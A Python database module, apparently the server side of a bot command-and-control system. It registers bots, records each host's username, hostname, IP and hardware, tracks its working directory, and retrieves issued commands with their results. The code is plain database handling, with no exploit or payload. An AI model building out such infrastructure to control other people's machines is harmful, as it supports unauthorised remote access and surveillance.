from database.dbmain import get_connection_pool

async def create_new_bot(token: str, username, hostname, ip, os, cpu, gpu, ram, disk):
    async with (await get_connection_pool()).acquire() as conn:
        try:
            # start transaction
            async with conn.transaction():
                # insert new bot using ON CONFLICT to handle duplicate tokens
                bot = await conn.fetchrow("""
                INSERT INTO bots (token, status)
                VALUES ($1, $2)
                ON CONFLICT (token) DO NOTHING
                RETURNING id
                """, token, "online")

                if not bot:
                    raise Exception("failed to insert or retrieve bot")
                
                bot_id = bot["id"]

                # insert bot info
                await conn.execute("""
                INSERT INTO bot_info (bot_id, username, hostname, ip, os, cpu, gpu, ram, disk)
                VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)
                """, bot_id, username, hostname, ip, os, cpu, gpu, ram, disk)

            return True
        except Exception as e:
            print(f"Exception: {str(e)}")
            return False

async def update_location(token, cur_dir):
    async with (await get_connection_pool()).acquire() as conn:
        try:
            bot = await get_bot(token)

            await conn.execute("""
            UPDATE bot_info
            SET current_directory = $1 
            WHERE bot_id = $2
            """, cur_dir, bot["id"])
            return True
        except Exception as e:
            print(f"Exception: {str(e)}")
            return False

async def get_bot(token: str):
    async with (await get_connection_pool()).acquire() as conn:
        try:
            bot = await conn.fetchrow("""
            SELECT * FROM bots WHERE token = $1
            """, token)
            return bot
        except Exception as e:
            return None

async def get_bot_info(bot_id):
    async with (await get_connection_pool()).acquire() as conn:
        try:
            bot_info = await conn.fetchrow("""
            SELECT * FROM bot_info WHERE bot_id = $1
            """, bot_id)
            return bot_info
        except Exception as e:
            return None

async def get_logs(bot_id):
    async with (await get_connection_pool()).acquire() as conn:
        try:
            logs = await conn.fetch("""
            SELECT commands.command, commands.directory, commands.status, logs.result FROM commands LEFT JOIN logs ON logs.command_id = commands.id 
            WHERE commands.bot_id = $1
            ORDER BY commands.issued_at ASC
            """, bot_id)
            return logs
        except Exception as e:
            print(f"exception: {str(e)}")
            return None